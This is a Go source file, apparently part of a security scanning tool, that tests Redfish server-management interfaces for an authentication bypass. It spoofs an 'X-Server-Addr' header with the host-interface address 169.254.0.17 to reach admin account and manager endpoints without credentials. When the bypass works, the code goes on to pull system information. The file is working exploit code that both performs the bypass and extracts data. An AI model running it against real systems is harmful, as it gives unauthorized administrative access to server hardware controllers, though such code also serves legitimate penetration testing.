package redfish

import (
	"net/http"
	"time"
)

const HostInterfaceAddr = "169.254.0.17"

const hostIfaceHeader = "X-Server-Addr"

var hostIfaceSpoofValues = []string{HostInterfaceAddr + ":", HostInterfaceAddr}

var hostIfaceAdminPaths = []string{"/redfish/v1/AccountService/Accounts", "/redfish/v1/Managers"}

type HostIfaceBypassResult struct {
	Confirmed   bool
	Path        string
	HeaderName  string
	HeaderValue string
	PlainStatus int
	SpoofStatus int
	Info        SystemInfo
	Snippet     string
}

func (r HostIfaceBypassResult) Header() string {
	return r.HeaderName + ": " + r.HeaderValue
}

func CheckHostInterfaceBypass(host string, port int, timeout time.Duration) HostIfaceBypassResult {
	return checkHostInterfaceBypass(insecureClient(nil, timeout), baseURL(host, port), timeout)
}

func checkHostInterfaceBypass(client *http.Client, base string, timeout time.Duration) HostIfaceBypassResult {
	res := HostIfaceBypassResult{HeaderName: hostIfaceHeader}
	for _, path := range hostIfaceAdminPaths {
		plainStatus, plainBody := authGet(client, base+path, nil, timeout)
		if plainStatus == 0 {
			return res
		}
		if isRedfishDoc(plainStatus, plainBody) {

			continue
		}
		for _, val := range hostIfaceSpoofValues {
			headers := map[string]string{hostIfaceHeader: val}
			spoofStatus, spoofBody := authGet(client, base+path, headers, timeout)
			if !isRedfishDoc(spoofStatus, spoofBody) {
				res.Path, res.HeaderValue = path, val
				res.PlainStatus, res.SpoofStatus = plainStatus, spoofStatus
				continue
			}
			res.Confirmed = true
			res.Path, res.HeaderValue = path, val
			res.PlainStatus, res.SpoofStatus = plainStatus, spoofStatus
			res.Snippet = bypassSnippet(spoofBody)

			res.Info = PullSystemInfo(client, base, headers, "", timeout)
			return res
		}
	}
	return res
}

func isRedfishDoc(status int, body []byte) bool {
	return status >= 200 && status < 300 && looksLikeRedfish(body) && !looksLikeLogin(body)
}
